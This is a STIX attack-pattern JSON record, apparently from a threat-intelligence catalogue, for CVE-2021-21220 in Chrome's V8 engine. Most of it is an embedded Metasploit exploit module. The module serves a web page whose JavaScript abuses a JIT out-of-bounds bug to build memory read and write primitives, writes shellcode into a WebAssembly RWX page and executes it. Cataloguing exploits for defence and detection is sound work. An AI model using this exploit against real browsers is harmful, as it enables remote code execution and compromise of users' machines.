{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9ced61e-65da-46a9-a3ae-0d35ae557057",
    "created": "2024-08-14T17:05:39.717663Z",
    "modified": "2024-08-14T17:05:39.717667Z",
    "name": "Google Chrome versions before 89.0.4389.128 V8 XOR Typer Out-Of-Bounds Access RCE",
    "description": " This module exploits an issue in the V8 engine on x86_x64 builds of Google Chrome before 89.0.4389.128/90.0.4430.72 when handling XOR operations in JIT'd JavaScript code. Successful exploitation allows an attacker to execute arbitrary code within the context of the V8 process.  As the V8 process is normally sandboxed in the default configuration of Google Chrome, the browser must be run with the --no-sandbox option for the payload to work correctly.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/chrome_cve_2021_21220_v8_insufficient_validation.rb",
            "external_id": "chrome_cve_2021_21220_v8_insufficient_validation.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-21220"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/r4j0x00/exploits/tree/master/chrome-0day"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/r4j0x00/status/1382125720344793090"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/advisories/ZDI-21-411/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Google Chrome versions before 89.0.4389.128 V8 XOR Typer Out-Of-Bounds Access RCE',\n        'Description' => %q{\n          This module exploits an issue in the V8 engine on x86_x64 builds of Google Chrome before 89.0.4389.128/90.0.4430.72\n          when handling XOR operations in JIT'd JavaScript code. Successful exploitation allows an attacker to execute\n          arbitrary code within the context of the V8 process.\n\n          As the V8 process is normally sandboxed in the default configuration of Google Chrome, the browser must be run with the\n          --no-sandbox option for the payload to work correctly.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Bruno Keith (bkth_)', # Vulnerability Discovery\n          'Niklas Baumstark (_niklasb)', # Vulnerabilty Discovery\n          'Rajvardhan Agarwal (r4j0x00)', # exploit\n          'Grant Willcox (tekwizz123)' # Metasploit Module\n        ],\n        'References' => [\n          ['CVE', '2021-21220'],\n          ['URL', 'https://github.com/r4j0x00/exploits/tree/master/chrome-0day'],\n          ['URL', 'https://twitter.com/r4j0x00/status/1382125720344793090'],\n          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=1196683'], # Restricted at the time of writing, but should be public at some point.\n          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-21-411/']\n        ],\n        'Arch' => [ ARCH_X64 ],\n        'DefaultTarget' => 0,\n        'Payload' => {\n          'Space' => 4096\n        },\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'Targets' => [\n          ['Linux - Google Chrome < 89.0.4389.128/90.0.4430.72 (64 bit)', { 'Platform' => 'linux' }],\n          ['Windows 10 - Google Chrome < 89.0.4389.128/90.0.4430.72 (64 bit)', { 'Platform' => 'win' }],\n          ['macOS - Google Chrome < 89.0.4389.128/90.0.4430.72 (64 bit)', { 'Platform' => 'osx' }],\n        ],\n        'DisclosureDate' => '2021-04-13'\n      )\n    )\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Sending #{request.uri} to #{request['User-Agent']}\")\n    shellcode = Rex::Text.to_num(payload.encoded).gsub(/\\r\\n/, '')\n    jscript = <<~JS\n      var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])\n      var wasm_mod = new WebAssembly.Module(wasm_code);\n      var wasm_instance = new WebAssembly.Instance(wasm_mod);\n      var wasm_main_func = wasm_instance.exports.main;\n\n      var buf = new ArrayBuffer(8);\n      var f64_buf = new Float64Array(buf);\n      var u64_buf = new Uint32Array(buf);\n\n      var shellcode = new Uint8Array([#{shellcode}]);\n      var shellbuf = new ArrayBuffer(shellcode.length);\n      var dataview = new DataView(shellbuf);\n\n      function ftoi(val) {\n        f64_buf[0] = val;\n        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);\n      }\n\n      function itof(val) {\n        u64_buf[0] = Number(val & 0xffffffffn);\n        u64_buf[1] = Number(val >> 32n);\n        return f64_buf[0];\n      }\n\n      const _arr = new Uint32Array([2**31]);\n\n      function foo() {\n        var x = 1;\n        x = (_arr[0] ^ 0) + 1;\n\n        x = Math.abs(x);\n        x -= 0x7FFFFFFF;\n        x = Math.max(x, 0);\n\n        x -= 1;\n        if(x==-1) x = 0;\n\n        var arr = new Array(x);\n        arr.shift();\n        var cor = [1.1, 1.2, 1.3];\n\n        return [arr, cor];\n      }\n\n      for(var i=0;i<0x3000;++i)\n        foo();\n\n      var x = foo();\n      var arr = x[0];\n      var cor = x[1];\n\n      const idx = 6;\n      arr[idx+10] = 0x4242;\n\n      if (cor.length == 3) location.reload();\n\n      function addrof(k) {\n        arr[idx+1] = k;\n        return ftoi(cor[0]) & 0xffffffffn;\n      }\n\n      function fakeobj(k) {\n        cor[0] = itof(k);\n        return arr[idx+1];\n      }\n\n      var arr2 = [cor[3], 1.2, 2.3, 3.4];\n      var fake = fakeobj(addrof(arr2) + 0x20n);\n\n      function arbread(addr) {\n        if (addr % 2n == 0) {\n          addr += 1n;\n        }\n        arr2[1] = itof((2n << 32n) + addr - 8n);\n        return (fake[0]);\n      }\n\n      function arbwrite(addr, val) {\n        if (addr % 2n == 0) {\n          addr += 1n;\n        }\n        arr2[1] = itof((2n << 32n) + addr - 8n);\n        fake[0] = itof(BigInt(val));\n      }\n\n      function copy_shellcode(addr, shellcode) {\n        let buf_addr = addrof(shellbuf);\n        let backing_store_addr = buf_addr + 0x14n;\n        arbwrite(backing_store_addr, addr);\n\n        for (let i = 0; i < shellcode.length; i++) {\n          dataview.setUint8(i, shellcode[i]);\n        }\n      }\n\n      var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));\n      copy_shellcode(rwx_page_addr, shellcode);\n      wasm_main_func();\n    JS\n\n    html = <<~HTML\n      <html>\n      <head>\n      <script>\n      #{jscript}\n      </script>\n      </head>\n      <body>\n      </body>\n      </html>\n    HTML\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-04-13"
}